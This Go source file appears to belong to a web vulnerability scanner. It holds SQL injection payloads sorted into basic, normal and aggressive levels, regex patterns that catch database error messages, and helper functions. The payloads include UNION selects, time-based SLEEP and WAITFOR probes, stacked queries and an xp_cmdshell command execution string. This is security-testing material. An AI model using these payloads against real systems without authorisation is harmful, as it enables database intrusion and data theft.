package payloads

import "regexp"

// SQLiPayloads contains SQL injection payloads organized by level
// Level 1 = Basic, Level 2 = Normal, Level 3 = Aggressive
var SQLiPayloads = map[int][]string{
	1: { // Basic
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
	},
	2: { // Normal
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' ORDER BY 10--",
		"1 UNION SELECT NULL--",
		"1' AND '1'='1",
		"1' AND SLEEP(5)--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1; SELECT * FROM users--",
	},
	3: { // Aggressive
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' ORDER BY 10--",
		"1 UNION SELECT NULL--",
		"1' AND '1'='1",
		"1' AND SLEEP(5)--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1; SELECT * FROM users--",
		"admin'--",
		"' UNION SELECT 1,2,3--",
		"' UNION SELECT NULL,NULL,NULL--",
		"1' AND 1=1 UNION SELECT 1,2,3--",
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"1;EXEC xp_cmdshell('dir')--",
		"1' AND BENCHMARK(5000000,MD5('test'))--",
		"' OR ''='",
		"' OR 1=1 LIMIT 1--",
		"') UNION SELECT * FROM users WHERE ('1'='1",
		"0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
	},
}

// SQLErrorPatterns contains regex patterns to detect SQL errors in responses
var SQLErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*mysql_`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)MySqlClient\.`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)Warning.*pg_`),
	regexp.MustCompile(`(?i)valid PostgreSQL result`),
	regexp.MustCompile(`(?i)Npgsql\.`),
	regexp.MustCompile(`(?i)Driver.* SQL[\-\_\ ]*Server`),
	regexp.MustCompile(`(?i)OLE DB.* SQL Server`),
	regexp.MustCompile(`(?i)SQLServer JDBC Driver`),
	regexp.MustCompile(`(?i)Microsoft SQL Native Client error`),
	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
	regexp.MustCompile(`(?i)SQLSrv`),
	regexp.MustCompile(`(?i)ORA-[0-9][0-9][0-9][0-9]`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)Oracle.*Driver`),
	regexp.MustCompile(`(?i)Warning.*oci_`),
	regexp.MustCompile(`(?i)Warning.*ora_`),
	regexp.MustCompile(`(?i)CLI Driver.*DB2`),
	regexp.MustCompile(`(?i)DB2 SQL error`),
	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
	regexp.MustCompile(`(?i)SQLite.Exception`),
	regexp.MustCompile(`(?i)System.Data.SQLite`),
	regexp.MustCompile(`(?i)Warning.*sqlite_`),
	regexp.MustCompile(`(?i)Warning.*SQLite3::`),
	regexp.MustCompile(`(?i)SQLITE_ERROR`),
	regexp.MustCompile(`(?i)SQL error.*POS([0-9]+)`),
	regexp.MustCompile(`(?i)Unclosed quotation mark`),
	regexp.MustCompile(`(?i)syntax error at or near`),
	regexp.MustCompile(`(?i)You have an error in your SQL`),
}

// GetSQLiPayloads returns SQL injection payloads for the given level
func GetSQLiPayloads(level int) []string {
	if p, ok := SQLiPayloads[level]; ok {
		return p
	}
	return SQLiPayloads[2] // Default to normal
}

// MatchesSQLError checks if body matches any SQL error pattern
func MatchesSQLError(body string) (bool, string) {
	for _, pattern := range SQLErrorPatterns {
		if pattern.MatchString(body) {
			return true, pattern.String()
		}
	}
	return false, ""
}
